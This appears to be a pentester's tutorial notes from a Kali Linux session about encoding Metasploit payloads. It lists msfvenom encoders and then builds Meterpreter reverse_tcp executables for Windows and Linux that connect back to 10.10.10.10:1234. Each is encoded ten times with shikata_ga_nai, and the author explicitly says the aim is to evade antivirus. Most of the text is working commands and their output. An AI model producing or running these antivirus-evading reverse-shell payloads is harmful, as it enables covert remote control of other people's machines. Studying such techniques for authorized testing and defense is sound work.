These encodings are not so much used as they easily get detected but as a pentester we shouild know how to encode our payload

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ `msfvenom --list encoders`

Framework Encoders [--encoder <value>]
======================================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    ruby/base64                   great      Ruby Base64 Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    x86/xor_dynamic               normal     Dynamic key XOR Encoder




# `Encoding Windows Payload`

# We can see that only 2 of them are ranked excellent

    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder

we can utulise x86/shikata_ga_nai  for both windows and linux payloads

# Lets generate a x86 payload as it will work for both 32 bit and 64 bit architecture

┌──(kali㉿kali)-[~]
└─$ `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -f exe > payload.exe`
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
                           

# We can do as many iterations we want, the more we encode the better chances to evade from AV, it is recommneded to iterate it 10 times because anything beyond that wont make sense
# with each iteration encoding increases and size as well

──(kali㉿kali)-[~]
└─$ `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe`
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes
Final size of exe file: 73802 bytes

# `Encoding Linux Payload`

# In Linux we have binary ie elf file instead of exe

──(kali㉿kali)-[~]
└─$ `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > mybinary`
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 150 (iteration=0)
x86/shikata_ga_nai succeeded with size 177 (iteration=1)
x86/shikata_ga_nai succeeded with size 204 (iteration=2)
x86/shikata_ga_nai succeeded with size 231 (iteration=3)
x86/shikata_ga_nai succeeded with size 258 (iteration=4)
x86/shikata_ga_nai succeeded with size 285 (iteration=5)
x86/shikata_ga_nai succeeded with size 312 (iteration=6)
x86/shikata_ga_nai succeeded with size 339 (iteration=7)
x86/shikata_ga_nai succeeded with size 366 (iteration=8)
x86/shikata_ga_nai succeeded with size 393 (iteration=9)
x86/shikata_ga_nai chosen with final size 393
Payload size: 393 bytes
Final size of elf file: 477 bytes
                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ `ls`
Desktop    Downloads  hydra.restore  mybinary        Nmapscanresult  packages.microsoft.gpg  Pictures  reverse.exe  Templates   tnet.nmap  Videos
Documents  hash.txt   Music          mycronjob.cron  -o              payload.exe             Public    Security     tnet.gnmap  tnet.xml   Windows-Exploit-Suggester
                                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ `file mybinary `
mybinary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header
                                                                                   
